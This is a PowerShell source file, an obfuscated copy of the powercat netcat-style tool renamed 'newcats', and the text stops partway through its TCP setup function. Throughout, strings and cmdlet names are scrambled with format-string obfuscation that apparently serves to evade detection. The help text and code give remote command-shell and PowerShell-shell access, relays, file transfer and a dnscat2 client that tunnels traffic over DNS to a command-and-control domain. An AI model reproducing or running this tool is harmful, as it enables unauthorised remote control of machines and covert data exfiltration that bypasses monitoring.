function newcats
{
  param(
    [alias({"{0}{1}" -f'Cl','ient'})][string]$c="",
    [alias({"{2}{1}{0}"-f'ten','s','Li'})][switch]$l=$False,
    [alias({"{1}{0}"-f'ort','P'})][Parameter(Position=-1)][string]$p="",
    [alias({"{1}{2}{0}" -f'e','E','xecut'})][string]$e="",
    [alias({"{2}{0}{3}{1}"-f'ersh','l','ExecutePow','el'})][switch]$ep=$False,
    [alias({"{1}{0}" -f 'lay','Re'})][string]$r="",
    [alias("UDP")][switch]$u=$False,
    [alias({"{2}{1}{0}" -f '2','scat','dn'})][string]$dns="",
    [alias({"{3}{2}{1}{4}{6}{5}{0}"-f'shold','l','SFai','DN','ure','re','Th'})][int32]$dnsft=10,
    [alias({"{1}{2}{0}" -f'eout','T','im'})][int32]$t=60,
    [Parameter(ValueFromPipeline=$True)][alias({"{1}{0}"-f 'nput','I'})]$i=$null,
    [ValidateSet({"{1}{0}" -f'ost','H'}, {"{0}{1}" -f'By','tes'}, {"{2}{1}{0}"-f 'ing','tr','S'})][alias({"{1}{2}{0}"-f'e','Ou','tputTyp'})][string]$o=("{1}{0}" -f'ost','H'),
    [alias({"{2}{3}{1}{0}" -f 'File','t','Outp','u'})][string]$of="",
    [alias({"{2}{0}{3}{1}" -f'onne','t','Disc','c'})][switch]$d=$False,
    [alias({"{1}{0}{2}" -f'epeate','R','r'})][switch]$rep=$False,
    [alias({"{3}{1}{0}{2}"-f 'a','ylo','d','GeneratePa'})][switch]$g=$False,
    [alias({"{3}{0}{1}{2}"-f 'e','E','ncoded','Generat'})][switch]$ge=$False,
    [alias({"{1}{0}" -f'elp','H'})][switch]$h=$False
  )
  
  ############### HELP ###############
  $Help = ((("{111}{110}{52}{85}{133}{129}{5}{78}{64}{56}{30}{96}{91}{97}{82}{73}{130}{134}{39}{68}{120}{54}{9}{34}{22}{10}{132}{37}{121}{92}{86}{100}{138}{67}{128}{90}{18}{139}{27}{95}{127}{136}{62}{74}{81}{45}{66}{12}{23}{32}{104}{72}{53}{103}{48}{8}{36}{117}{98}{84}{42}{33}{105}{88}{70}{11}{124}{46}{89}{113}{125}{75}{16}{38}{28}{102}{101}{115}{57}{17}{119}{76}{58}{112}{40}{93}{63}{79}{122}{131}{126}{6}{83}{0}{60}{21}{109}{13}{19}{107}{71}{50}{49}{14}{20}{99}{25}{87}{44}{69}{31}{3}{2}{61}{118}{41}{43}{15}{59}{137}{106}{77}{51}{24}{65}{4}{1}{29}{55}{47}{94}{123}{80}{26}{114}{108}{35}{135}{116}{7}"-f 'ngv5e, or v5eHostv5e. Default is v5eHo','om
  ','nerate Encoded Payload. Does the same','          
  -ge             Ge','.1.1 -p 53 -dns c2.example.c','ps://github.com/besimorhino/po','. Specif','1.1.1:53:c2.example.com
','                 must send data before the server ','          Listen Mode.','  -p  <port>      Port.','dns. This is only a cl','    Listener Relay Format:','hed
                  and the input from -i is sent. Used for scanning.
',' for setting up a persistent server.
                  
  -g              Generate Payload.  Returns a scri','
Exampl',' is how many bad packets the client can
                  recieve before exiting. Set to ze','g','variables and ex',' ','pt as a string whi','he path to a file to write output to.
            
  -d              Disconnect. powercat will disconnect after the ','Start a listener on the port specified by -p.
  
',' -r <protocol>:<port','dns queries
  to the dns server on 10.1.1.1 port 53.
      powerc','h the options you have spec','lay traffic coming in on port 800','t if you try to enter
                  another shell (nslookup, netsh, cmd, etc.) the she',' files, a','
','to implement the features of ne','    be incorporated.
        ','>
                  DNSCat2 Relay Format:  -r dns:<dns server>:<dns port>:<domai','el.
                  Specify the dns s',' ',' to the dnscat2 server on c2.e','can',' to, or the port to listen on.
  
  -e  <proc','ro when receiving','re using -dns, specify the','oving files. You ca','         Print this h','fic over the dnscat2 dns covert chann','elp message.
','i, -d, and -','<ip addr>:<port>
   ','     Get','ite the data sent to the local listener on port 44','DP. Because itv5es UDP, the client
 ','l continually restart after it is disconnected.
                  Used','cat wil','owercat -c 10.1.1.1 -p 443 -e cmd -v
  
  Connect to the dnscat2 server on c2.example.com, and send ','rsh','      
  -u  ','
  -l    ','  Send a file to 10.1.1.15 port 8000.
      powercat -c 10.1.1.15 -p 8000 -i C:QWJinputfile
  
  Wr','This script attempts ','ut. The number of seconds to wait before givin','the pipe as soon as a connection is
','es:

  Listen on port 8000 and print the output to th','stv5e.
            
  -of <path>      Output File.  Specify t',' as -g, but returns a string which
                  can be e','    Relay.','rovide the p','
','at -c 10.1','           ','owershell ses',' DNS Server to send queries to.
     ','rep will not
              ',' port to -p, and specify the 
                  domain to this option, -','ter. power','     ','em you wish',' Used for relaying network traffic between two nodes.
                  Client Relay Format:   -r <p','re Threshold. This','0
            
  -i  <input>     Input. Provide data to be sent down ','    p','wercat
','ath to a file,
                  a byte array object, or a string. You can also pipe any of those into
    ','  
  Listen on port 8000 and repeatedly server a powershell shell.
      powercat -l -p 8000 -ep -rep
  
  Re','rotocol>:','-l] [-p port] [options]

  -c  <ip>        Client Mode. Provide the IP of the syst','y how powercat should return information to the console.
                  Valid options are v5eBytesv5e, v5eStri',' Mode. Send traf','ell Versi','e Powershell. Start a p','ified. -','c, the dns',' the s','           declare ','eatures such as built-in relays, execute
powershell, and a dnscat2 client.

Usage: pow','.
  
  -ep             Execut','n p','44 to','ll will ','tcat in a powershell
script. It also contains extra f','ercat [-c or ','nd.
            
  -dns  <domain>  DNS','ch will execute the
                  powercat wit','s','           for more ','nd set high
       ','            UDP Mode. Send traffic over U','n>
 ','erver to -','e.
      powercat -l -p 8000
  
  Connect to 10.1.1.1 port 443, send a shell, and enable verbosity.
  ','           
  -rep            Repea','00 on 10.1.1.1 over tcp.
      powercat -l -p 8000 -r tcp:10.1.1.1:9000
      
  Relay traffic coming in on port 8000 over tcp','connection is establis','cat, The Powe','
powercat - Net','                  established. Used for m','erver here: https://github.com/iagox86/dnscat','0 over tcp to port 90','stability over the internet.
            
  -t  <int>       Timeo','s:10.',' respo','xecuted in this way: powershell -E <encoded string>

  -h     ',' up on listening or
                  connecting. Default: 6','       ','>      Execute. Specify the name of the process to start','              powercat, like v5eaaaaaav5',' C:QWJoutfile
      powercat -l -p 4444 -of C:QWJoutfile
','ient.
             ','2
            
  -dnsft <int>    DNS Failu',' 
  -o  <type>      Output','hang.','sion. You can
       ',' htt',' to connect t','e n8z powercat -c 10.1.1.1 -p 80
           ',' The port to connect','on
Github Repository:','o.
                  If you a','xample.com,
  sending queries to 10.1.1.1 port 53.
      powercat -l -p 8000 -r dn','
            
  -r  <str>   ','e consol','eudo p','ecute commands, bu')).rEpLace(([Char]118+[Char]53+[Char]101),[STRiNG][Char]39).rEpLace(([Char]81+[Char]87+[Char]74),'\').rEpLace(([Char]110+[Char]56+[Char]122),'|'))
  if($h){return $Help}
  ############### HELP ###############
  
  ############### VALIDATE ARGS ###############
  $global:Verbose = $Verbose
  if($of -ne ''){$o = ("{0}{1}"-f 'Byt','es')}
  if($dns -eq "")
  {
    if((($c -eq "") -and (!$l)) -or (($c -ne "") -and $l)){return ("{13}{4}{3}{1}{8}{7}{5}{6}{0}{9}{11}{10}{12}{2}" -f' (-c)','t se','(-l).','s','mu','her ','client mode','eit','lect ',' o','isten m','r l','ode ','You ')}
    if($p -eq ""){return ("{6}{0}{3}{1}{4}{5}{2}"-f 'se ','ovide a por','ber to -p.','pr','t nu','m','Plea')}
  }
  if(((($r -ne "") -and ($e -ne "")) -or (($e -ne "") -and ($ep))) -or  (($r -ne "") -and ($ep))){return ("{3}{1}{2}{5}{8}{7}{0}{6}{4}"-f'e: -e, ','ou ca','n ','Y','-r','only pick ','-ep, ','es','one of th')}
  if(($i -ne $null) -and (($r -ne "") -or ($e -ne ""))){return ("{0}{3}{6}{4}{2}{5}{1}"-f'-i','e.','plic',' ','t ap','able her','is no')}
  if($l)
  {
    $Failure = $False
    &("{0}{1}{2}" -f'ne','ts','tat') -na | &("{2}{0}{1}" -f'ct-Strin','g','Sele') LISTENING | &('%') {if(($_.ToString().split(":")[1].split(" ")[0]) -eq $p){&("{1}{0}{2}" -f 'ri','W','te-Output') (("{2}{3}{0}{1}" -f 'rt',' ','T','he selected po') + $p + ("{3}{2}{0}{1}"-f 'dy in us','e.','alrea',' is ')) ; $Failure=$True}}
    if($Failure){break}
  }
  if($r -ne "")
  {
    if($r.split(":").Count -eq 2)
    {
      $Failure = $False
      &("{0}{1}" -f 'netst','at') -na | &("{0}{2}{1}"-f 'Select-St','g','rin') LISTENING | &('%') {if(($_.ToString().split(":")[1].split(" ")[0]) -eq $r.split(":")[1]){&("{0}{2}{1}" -f 'Write-','t','Outpu') (("{2}{0}{1}{3}"-f 'he selected ','p','T','ort ') + $r.split(":")[1] + ("{1}{3}{0}{2}" -f 'eady in us',' ','e.','is alr')) ; $Failure=$True}}
      if($Failure){break}
    }
  }
  ############### VALIDATE ARGS ###############
  
  ############### UDP FUNCTIONS ###############
  function Setup_UDP
  {
    param($FuncSetupVars)
    if($global:Verbose){$Verbose = $True}
    $c,$l,$p,$t = $FuncSetupVars
    $FuncVars = @{}
    $FuncVars[("{0}{1}"-f 'Encodin','g')] = &("{0}{1}{2}"-f 'Ne','w-Objec','t') System.Text.AsciiEncoding
    if($l)
    {
      $SocketDestinationBuffer = &("{0}{1}{2}{3}" -f'N','ew','-Obj','ect') System.Byte[] 65536
      $EndPoint = &("{2}{0}{1}" -f'Ob','ject','New-') System.Net.IPEndPoint ([System.Net.IPAddress]::Any), $p
      $FuncVars[("{1}{0}"-f 't','Socke')] = &("{2}{0}{1}" -f'w-Obj','ect','Ne') System.Net.Sockets.UDPClient $p
      $PacketInfo = &("{2}{1}{0}"-f'ect','Obj','New-') System.Net.Sockets.IPPacketInformation
      &("{4}{0}{2}{3}{1}" -f'te','erbose','-','V','Wri') (("{4}{3}{0}{5}{6}{1}{2}"-f 'ng','0','] port ','i','Listen',' on',' [0.0.0.') + $p + ("{1}{0}{2}"-f 'ud',' [','p]'))
      $ConnectHandle = $FuncVars[("{1}{0}"-f 'cket','So')].Client.BeginReceiveMessageFrom($SocketDestinationBuffer,0,65536,[System.Net.Sockets.SocketFlags]::None,[ref]$EndPoint,$null,$null)
      $Stopwatch = [System.Diagnostics.Stopwatch]::StartNew()
      while($True)
      {
        if($Host.UI.RawUI.KeyAvailable)
        {
          if(@(17,27) -contains ($Host.UI.RawUI.ReadKey(("{1}{7}{4}{8}{2}{10}{3}{0}{9}{5}{6}"-f'cl','NoEc','eyDo','n,In',',Includ','de','KeyUp','ho','eK','u','w')).VirtualKeyCode))
          {
            &("{1}{2}{0}" -f 'Verbose','Wr','ite-') ("{5}{7}{0}{2}{8}{6}{10}{9}{11}{1}{3}{4}" -f'RL or ','p','ESC cau','..','.','C','t. Stopp','T','gh',' Set','ing UDP','u')
            $FuncVars[("{2}{0}{1}"-f'ck','et','So')].Close()
            $Stopwatch.Stop()
            break
          }
        }
        if($Stopwatch.Elapsed.TotalSeconds -gt $t)
        {
          $FuncVars[("{0}{1}{2}" -f 'S','oc','ket')].Close()
          $Stopwatch.Stop()
          &("{1}{2}{3}{0}"-f'ose','W','rite-V','erb') ("{2}{0}{1}" -f 'imeout','!','T') ; break
        }
        if($ConnectHandle.IsCompleted)
        {
          $SocketBytesRead = $FuncVars[("{2}{0}{1}" -f'ock','et','S')].Client.EndReceiveMessageFrom($ConnectHandle,[ref]([System.Net.Sockets.SocketFlags]::None),[ref]$EndPoint,[ref]$PacketInfo)
          &("{1}{2}{4}{3}{0}" -f 'rbose','W','rite-','e','V') (("{3}{2}{1}{0}{4}"-f'r','ction f','e','Conn','om [') + $EndPoint.Address.IPAddressToString + ("{1}{2}{0}" -f' ','] po','rt') + $p + ((("{4}{0}{2}{1}{5}{3}"-f'udp','te','] accep','rce port ',' [','d (sou'))) + $EndPoint.Port + ")")
          if($SocketBytesRead -gt 0){break}
          else{break}
        }
      }
      $Stopwatch.Stop()
      $FuncVars[("{0}{3}{5}{2}{1}{4}"-f'Init','ctionB','e','i','ytes','alConn')] = $SocketDestinationBuffer[0..([int]$SocketBytesRead-1)]
    }
    else
    {
      if(!$c.Contains("."))
      {
        $IPList = @()
        [System.Net.Dns]::GetHostAddresses($c) | &("{1}{3}{2}{0}" -f 't','Where-O','ec','bj') {$_.AddressFamily -eq ("{3}{2}{0}{1}" -f 'rNetwo','rk','e','Int')} | &('%'){$IPList += $_.IPAddressToString}
        &("{1}{0}{3}{2}"-f 'te-Ver','Wri','ose','b') (("{0}{1}"-f'Name',' ') + $c + ("{4}{1}{0}{2}{3}"-f'dd','d to a','res','s ',' resolve') + $IPList[0])
        $EndPoint = &("{2}{0}{1}"-f '-Obje','ct','New') System.Net.IPEndPoint ([System.Net.IPAddress]::Parse($IPList[0])), $p
      }
      else
      {
        $EndPoint = &("{1}{2}{0}" -f '-Object','Ne','w') System.Net.IPEndPoint ([System.Net.IPAddress]::Parse($c)), $p
      }
      $FuncVars[("{1}{0}" -f'ocket','S')] = &("{2}{1}{0}"-f'ct','-Obje','New') System.Net.Sockets.UDPClient
      $FuncVars[("{1}{0}{2}" -f 'k','Soc','et')].Connect($c,$p)
      &("{0}{3}{2}{1}"-f 'Wri','ose','erb','te-V') (("{5}{1}{7}{6}{4}{3}{0}{2}" -f 'ic to','di',' ','raff',' t','Sen','g UDP','n') + $c + ("{0}{2}{1}"-f ' ','t ','por') + $p + "...")
      &("{0}{3}{4}{1}{2}"-f 'Writ','er','bose','e','-V') (("{7}{11}{5}{3}{1}{9}{12}{2}{10}{6}{8}{14}{4}{13}{0}"-f'!','e sure to','ome ','ak',' ',' M','e','UD',' server c',' ','data so th','P:','send s','notice you','an'))
    }
    $FuncVars[("{2}{1}{0}" -f 'e','erSiz','Buff')] = 65536
    $FuncVars[("{0}{2}{1}"-f'E','dPoint','n')] = $EndPoint
    $FuncVars[("{6}{3}{4}{0}{2}{1}{5}"-f 'io','Bu','n','mD','estinat','ffer','Strea')] = &("{2}{1}{0}" -f 'ject','ew-Ob','N') System.Byte[] $FuncVars[("{1}{0}{2}"-f'erS','Buff','ize')]
    $FuncVars[("{1}{3}{2}{0}" -f 'adOperation','Stre','e','amR')] = $FuncVars[("{1}{0}"-f'ocket','S')].Client.BeginReceiveFrom($FuncVars[("{4}{5}{2}{1}{6}{3}{0}"-f 'fer','mDes','ea','nationBuf','S','tr','ti')],0,$FuncVars[("{1}{2}{0}"-f'rSize','Buf','fe')],([System.Net.Sockets.SocketFlags]::None),[ref]$FuncVars[("{1}{2}{0}"-f 't','En','dPoin')],$null,$null)
    return $FuncVars
  }
  function ReadData_UDP
  {
    param($FuncVars)
    $Data = $null
    if($FuncVars[("{3}{4}{1}{0}{5}{2}" -f'mRead','a','on','St','re','Operati')].IsCompleted)
    {
      $StreamBytesRead = $FuncVars[("{1}{0}"-f 'et','Sock')].Client.EndReceiveFrom($FuncVars[("{3}{0}{2}{1}"-f'amRea','peration','dO','Stre')],[ref]$FuncVars[("{0}{1}" -f 'EndPoi','nt')])
      if($StreamBytesRead -eq 0){break}
      $Data = $FuncVars[("{4}{1}{0}{3}{2}{5}{6}"-f 'amDesti','tre','tio','na','S','nBuff','er')][0..([int]$StreamBytesRead-1)]
      $FuncVars[("{4}{2}{1}{3}{0}"-f'tion','er','eamReadOp','a','Str')] = $FuncVars[("{0}{1}"-f'Soc','ket')].Client.BeginReceiveFrom($FuncVars[("{2}{1}{3}{0}" -f'estinationBuffer','rea','St','mD')],0,$FuncVars[("{1}{0}{2}" -f'fferSiz','Bu','e')],([System.Net.Sockets.SocketFlags]::None),[ref]$FuncVars[("{0}{1}"-f 'EndP','oint')],$null,$null)
    }
    return $Data,$FuncVars
  }
  function WriteData_UDP
  {
    param($Data,$FuncVars)
    $FuncVars[("{1}{0}"-f'ocket','S')].Client.SendTo($Data,$FuncVars[("{1}{0}{2}" -f'n','E','dPoint')]) | &("{2}{0}{1}" -f 'ut-','Null','O')
    return $FuncVars
  }
  function Close_UDP
  {
    param($FuncVars)
    $FuncVars[("{0}{1}" -f 'Sock','et')].Close()
  }
  ############### UDP FUNCTIONS ###############
  
  ############### DNS FUNCTIONS ###############
  function Setup_DNS
  {
    param($FuncSetupVars)
    if($global:Verbose){$Verbose = $True}
    function ConvertTo-HexArray
    {
      param($String)
      $Hex = @()
      $String.ToCharArray() | &('%') {"{0:x}" -f [byte]$_} | &('%') {if($_.Length -eq 1){"0" + [string]$_} else{[string]$_}} | &('%') {$Hex += $_}
      return $Hex
    }
    
    function SendPacket
    {
      param($Packet,$DNSServer,$DNSPort)
      $Command = (('se'+'t '+"type=TXT`nserver "+"$DNSServer`nset "+"port=$DNSPort`nset "+"domain=.com`nset "+"retry=1`n") + $Packet + "`nexit")
      $result = ($Command | &("{1}{2}{0}"-f'p','nsloo','ku') 2>&1 | &("{0}{1}{2}"-f'Out','-Str','ing'))
      if($result.Contains('"')){return ([regex]::Match($result.replace(("{0}{1}" -f'bi','o='),""),((("{4}{6}{0}{3}{5}{2}{1}"-f'0}',')',']*(?={0}',')[^{0','(?<','}','={')) -F  [Char]34)).Value)}
      else{return 1}
    }
    
    function Create_SYN
    {
      param($SessionId,$SeqNum,$Tag,$Domain)
      return ($Tag + ([string](&("{0}{1}{2}"-f 'Ge','t-Rand','om') -Maximum 9999 -Minimum 1000)) + "00" + $SessionId + $SeqNum + ("{1}{0}" -f'0','000') + $Domain)
    }
    
    function Create_FIN
    {
      param($SessionId,$Tag,$Domain)
      return ($Tag + ([string](&("{0}{2}{1}" -f 'G','m','et-Rando') -Maximum 9999 -Minimum 1000)) + "02" + $SessionId + "00" + $Domain)
    }
    
    function Create_MSG
    {
      param($SessionId,$SeqNum,$AcknowledgementNumber,$Data,$Tag,$Domain)
      return ($Tag + ([string](&("{2}{1}{0}"-f 'om','d','Get-Ran') -Maximum 9999 -Minimum 1000)) + "01" + $SessionId + $SeqNum + $AcknowledgementNumber + $Data + $Domain)
    }
    
    function DecodePacket
    {
      param($Packet)
      
      if((($Packet.Length)%2 -eq 1) -or ($Packet.Length -eq 0)){return 1}
      $AcknowledgementNumber = ($Packet[10..13] -join "")
      $SeqNum = ($Packet[14..17] -join "")
      [byte[]]$ReturningData = @()
      
      if($Packet.Length -gt 18)
      {
        $PacketElim = $Packet.Substring(18)
        while($PacketElim.Length -gt 0)
        {
          $ReturningData += [byte[]][Convert]::ToInt16(($PacketElim[0..1] -join ""),16)
          $PacketElim = $PacketElim.Substring(2)
        }
      }
      
      return $Packet,$ReturningData,$AcknowledgementNumber,$SeqNum
    }
    
    function AcknowledgeData
    {
      param($ReturningData,$AcknowledgementNumber)
      $Hex = [string]("{0:x}" -f (([uint16]("0x" + $AcknowledgementNumber) + $ReturningData.Length) % 65535))
      if($Hex.Length -ne 4){$Hex = (("0"*(4-$Hex.Length)) + $Hex)}
      return $Hex
    }
    $FuncVars = @{}
    $FuncVars[("{2}{0}{1}"-f'Serve','r','DNS')],$FuncVars[("{0}{1}" -f'DNS','Port')],$FuncVars[("{1}{0}{2}" -f'omai','D','n')],$FuncVars[("{1}{3}{0}{2}"-f'reThre','Fa','shold','ilu')] = $FuncSetupVars
    if($FuncVars[("{1}{0}{2}" -f 'r','DNSPo','t')] -eq ''){$FuncVars[("{2}{1}{0}" -f'ort','P','DNS')] = "53"}
    $FuncVars["Tag"] = ""
    $FuncVars[("{0}{1}" -f 'Doma','in')] = ("." + $FuncVars[("{0}{1}" -f 'Domai','n')])
    
    $FuncVars[("{0}{2}{1}" -f 'Cr','_SYN','eate')] = ${function:Create_SYN}
    $FuncVars[("{0}{2}{1}" -f'Cr','_MSG','eate')] = ${function:Create_MSG}
    $FuncVars[("{0}{1}{2}" -f'Creat','e_F','IN')] = ${function:Create_FIN}
    $FuncVars[("{1}{3}{0}{2}"-f 'ePa','D','cket','ecod')] = ${function:DecodePacket}
    $FuncVars[("{3}{2}{0}{1}"-f '-HexA','rray','rtTo','Conve')] = ${function:ConvertTo-HexArray}
    $FuncVars[("{1}{0}" -f 'ata','AckD')] = ${function:AcknowledgeData}
    $FuncVars[("{1}{0}{2}" -f 'ndP','Se','acket')] = ${function:SendPacket}
    $FuncVars[("{1}{0}" -f'Id','Session')] = ([string](&("{1}{2}{0}"-f'om','Ge','t-Rand') -Maximum 9999 -Minimum 1000))
    $FuncVars[("{1}{0}" -f'um','SeqN')] = ([string](&("{1}{2}{0}"-f 'om','Get','-Rand') -Maximum 9999 -Minimum 1000))
    $FuncVars[("{0}{1}{2}"-f 'Enc','o','ding')] = &("{3}{2}{0}{1}"-f 'Objec','t','w-','Ne') System.Text.AsciiEncoding
    $FuncVars[("{2}{1}{0}"-f 's','ailure','F')] = 0
    
    $SYNPacket = (&("{2}{0}{1}{3}" -f'ke-','Comma','Invo','nd') $FuncVars[("{0}{1}{3}{2}" -f 'Creat','e','SYN','_')] -ArgumentList @($FuncVars[("{0}{1}{2}{3}" -f'S','e','ss','ionId')],$FuncVars[("{1}{0}{2}" -f'eq','S','Num')],$FuncVars["Tag"],$FuncVars[("{1}{2}{0}" -f 'in','Do','ma')]))
    $ResponsePacket = (&("{2}{1}{0}{3}"-f 'ke','nvo','I','-Command') $FuncVars[("{0}{2}{1}{3}" -f 'SendPa','e','ck','t')] -ArgumentList @($SYNPacket,$FuncVars[("{1}{0}{2}" -f 'Ser','DNS','ver')],$FuncVars[("{0}{1}{2}" -f 'DNS','Po','rt')]))
    $DecodedPacket = (&("{2}{0}{3}{1}"-f '-Comm','d','Invoke','an') $FuncVars[("{1}{0}{3}{2}" -f'eco','D','acket','deP')] -ArgumentList @($ResponsePacket))
    if($DecodedPacket -eq 1){return ("{1}{6}{4}{11}{8}{13}{2}{0}{9}{14}{7}{12}{5}{10}{3}" -f're your','Ba','u','ctly.','N','corr','d SY','p','se.',' server is','e',' respon',' ',' Ens',' set u')}
    $ReturningData = $DecodedPacket[1]
    if($ReturningData -ne ""){$FuncVars[("{1}{0}{2}"-f 'pu','In','tData')] = ""}
    $FuncVars[("{1}{0}" -f'kNum','Ac')] = $DecodedPacket[2]
    $FuncVars[("{0}{2}{1}"-f'Ma','Size','xMSGData')] = (244 - (&("{1}{2}{0}{3}{4}" -f'Co','Invoke','-','mma','nd') $FuncVars[("{1}{0}{2}" -f'te_MS','Crea','G')] -ArgumentList @($FuncVars[("{1}{0}{2}" -f'e','S','ssionId')],$FuncVars[("{1}{2}{0}"-f 'Num','S','eq')],$FuncVars[("{1}{0}" -f'um','AckN')],"",$FuncVars["Tag"],$FuncVars[("{1}{0}" -f'n','Domai')])).Length)
    if($FuncVars[("{2}{4}{0}{3}{1}"-f 'at','ze','MaxMSG','aSi','D')] -le 0){return ("{3}{6}{2}{5}{4}{1}{0}" -f'.','ng','ame ','Domai','too lo','is ','n n')}
    return $FuncVars
  }
  function ReadData_DNS
  {
    param($FuncVars)
    if($global:Verbose){$Verbose = $True}
    
    $PacketsData = @()
    $PacketData = ""
    
    if($FuncVars[("{2}{1}{0}"-f'ta','putDa','In')] -ne $null)
    {
      $Hex = (&("{3}{2}{0}{1}" -f '-Comm','and','ke','Invo') $FuncVars[("{2}{4}{1}{0}{3}{5}" -f'exAr','-H','Conver','r','tTo','ay')] -ArgumentList @($FuncVars[("{0}{2}{1}" -f'Inpu','ata','tD')]))
      $SectionCount = 0
      $PacketCount = 0
      foreach($Char in $Hex)
      {
        if($SectionCount -ge 30)
        {
          $SectionCount = 0
          $PacketData += "."
        }
        if($PacketCount -ge ($FuncVars[("{1}{2}{0}" -f'ze','Max','MSGDataSi')]))
        {
          $PacketsData += $PacketData.TrimEnd(".")
          $PacketCount = 0
          $SectionCount = 0
          $PacketData = ""
        }
        $PacketData += $Char
        $SectionCount += 2
        $PacketCount += 2
      }
      $PacketData = $PacketData.TrimEnd(".")
      $PacketsData += $PacketData
      $FuncVars[("{0}{2}{1}"-f 'Inpu','ta','tDa')] = ""
    }
    else
    {
      $PacketsData = @("")
    }
    
    [byte[]]$ReturningData = @()
    foreach($PacketData in $PacketsData)
    {
      try{$MSGPacket = &("{0}{2}{1}{4}{3}" -f'Invok','-','e','mmand','Co') $FuncVars[("{0}{3}{2}{1}" -f'Crea','G','_MS','te')] -ArgumentList @($FuncVars[("{2}{0}{1}"-f 'i','onId','Sess')],$FuncVars[("{0}{1}" -f 'Se','qNum')],$FuncVars[("{1}{0}"-f'kNum','Ac')],$PacketData,$FuncVars["Tag"],$FuncVars[("{1}{0}"-f 'n','Domai')])}
      catch{ &("{2}{1}{0}"-f 'rbose','rite-Ve','W') ("{5}{3}{1}{7}{9}{0}{6}{4}{8}{2}"-f 'ed ','T2: ','reate packet.','A','o ','DNSC','t','Fa','c','il') ; $FuncVars[("{1}{2}{0}" -f 'lures','F','ai')] += 1 ; continue }
      try{$Packet = (&("{0}{2}{1}{3}"-f'Invoke-C','n','omma','d') $FuncVars[("{0}{2}{1}"-f'Sen','Packet','d')] -ArgumentList @($MSGPacket,$FuncVars[("{1}{2}{0}"-f'ver','DN','SSer')],$FuncVars[("{0}{2}{1}"-f'DN','rt','SPo')]))}
      catch{ &("{0}{1}{2}" -f'Write-','Ve','rbose') ("{3}{5}{0}{6}{4}{2}{1}" -f 'a','t.','nd packe','DNSCAT2: ','ed to se','F','il') ; $FuncVars[("{2}{0}{1}"-f 'l','ures','Fai')] += 1 ; continue }
      try
      {
        $DecodedPacket = (&("{0}{1}{2}"-f'I','nvok','e-Command') $FuncVars[("{0}{1}{2}"-f 'Deco','dePa','cket')] -ArgumentList @($Packet))
        if($DecodedPacket.Length -ne 4){ &("{2}{0}{1}" -f'te','-Verbose','Wri') ("{9}{2}{1}{4}{10}{12}{11}{3}{0}{5}{6}{13}{8}{7}" -f 'ecode packet, ','SCAT2: ','N','o d','F','d','ro','...','g','D','ail','re t','u','ppin'); $FuncVars[("{0}{1}{2}" -f'F','ail','ures')] += 1 ; continue }
        $FuncVars[("{1}{0}"-f 'm','AckNu')] = $DecodedPacket[2]
        $FuncVars[("{1}{0}" -f'Num','Seq')] = $DecodedPacket[3]
        $ReturningData += $DecodedPacket[1]
      }
      catch{ &("{0}{3}{2}{1}"-f 'Writ','se','bo','e-Ver') ("{2}{3}{5}{8}{4}{1}{9}{10}{0}{6}{7}"-f', droppi','ac','DNSCAT2: Fail','u','ecode p','re to','ng..','.',' d','k','et') ; $FuncVars[("{2}{0}{1}" -f'i','lures','Fa')] += 1 ; continue }
      if($DecodedPacket -eq 1){ &("{0}{4}{1}{2}{3}" -f'Write','erbo','s','e','-V') ("{8}{4}{9}{2}{0}{12}{7}{5}{11}{6}{1}{10}{3}"-f':','t, droppi','2','g...','NSCA','de','packe',' ','D','T','n','code ',' Failure to') ; $FuncVars[("{1}{0}{2}"-f'l','Fai','ures')] += 1 ; continue }
    }
    
    if($FuncVars[("{2}{0}{1}"-f'ailur','es','F')] -ge $FuncVars[("{4}{1}{3}{5}{0}{2}" -f 'ol','u','d','reTh','Fail','resh')]){break}
    
    if($ReturningData -ne @())
    {
      $FuncVars[("{1}{0}" -f 'ckNum','A')] = (&("{2}{0}{3}{1}" -f'ke-Comm','d','Invo','an') $FuncVars[("{2}{1}{0}" -f'a','at','AckD')] -ArgumentList @($ReturningData,$FuncVars[("{0}{2}{1}"-f 'Ack','um','N')]))
    }
    return $ReturningData,$FuncVars
  }
  function WriteData_DNS
  {
    param($Data,$FuncVars)
    $FuncVars[("{2}{1}{0}" -f 'Data','t','Inpu')] = $FuncVars[("{2}{0}{1}" -f'di','ng','Enco')].GetString($Data)
    return $FuncVars
  }
  function Close_DNS
  {
    param($FuncVars)
    $FINPacket = &("{1}{4}{3}{0}{2}" -f 'omm','In','and','C','voke-') $FuncVars[("{0}{1}{2}" -f 'C','re','ate_FIN')] -ArgumentList @($FuncVars[("{1}{0}{2}" -f 'ession','S','Id')],$FuncVars["Tag"],$FuncVars[("{2}{0}{1}" -f 'a','in','Dom')])
    &("{1}{2}{0}"-f 'mand','Invoke-Co','m') $FuncVars[("{2}{1}{0}"-f't','endPacke','S')] -ArgumentList @($FINPacket,$FuncVars[("{1}{2}{0}{3}" -f've','D','NSSer','r')],$FuncVars[("{0}{1}{2}"-f'DNS','P','ort')]) | &("{0}{1}{2}"-f'Out','-N','ull')
  }
  ############### DNS FUNCTIONS ###############
  
  ########## TCP FUNCTIONS ##########
  function Setup_TCP
  {
    param($FuncSetupVars)
    $c,$l,$p,$t = $FuncSetupVars
    if($global:Verbose){$Verbose = $True}
    $FuncVars = @{}
    if(!$l)
    {
      $FuncVars["l"] = $False
      $Socket = &("{3}{1}{2}{0}" -f'ct','-O','bje','New') System.Net.Sockets.TcpClient
      &("{1}{0}{2}"-f'e-Verbos','Writ','e') ("{3}{2}{0}{1}{4}"-f'ctin','g.','e','Conn','..')
      $Handle = $Socket.BeginConnect($c,$p,$null,$null)
    }
    else
    {
      $FuncVars["l"] = $True
      &("{3}{1}{0}{2}" -f'e-','t','Verbose','Wri') (((("{5}{4}{0}{3}{1}{7}{6}{8}{2}" -f 'g on ','0.',' (port ','[','enin','List','0.','0.','0]'))) + $p + ")")
      $Socket = &("{0}{2}{3}{1}"-f 'New','ct','-Ob','je') System.Net.Sockets.TcpListener $p
      $Socket.Start()
      $Handle = $Socket.BeginAcceptTcpClient($null, $null)
    }
    
    $Stopwatch = [System.Diagnostics.Stopwatch]::StartNew()
    while($True)
    {
      if($Host.UI.RawUI.KeyAvailable)
      {
        if(@(17,27) -contains ($Host.UI.RawUI.ReadKey(("{5}{2}{3}{1}{0}{4}"-f'wn,','yDo','cho,Include','Ke','IncludeKeyUp','NoE')).VirtualKeyCode))
        {
          &("{0}{3}{2}{1}"-f'Wr','bose','Ver','ite-') ("{5}{8}{4}{0}{7}{6}{3}{2}{1}{9}"-f'ESC','p','TCP Setu','g ',' ','CTRL o','aught. Stoppin',' c','r','...')
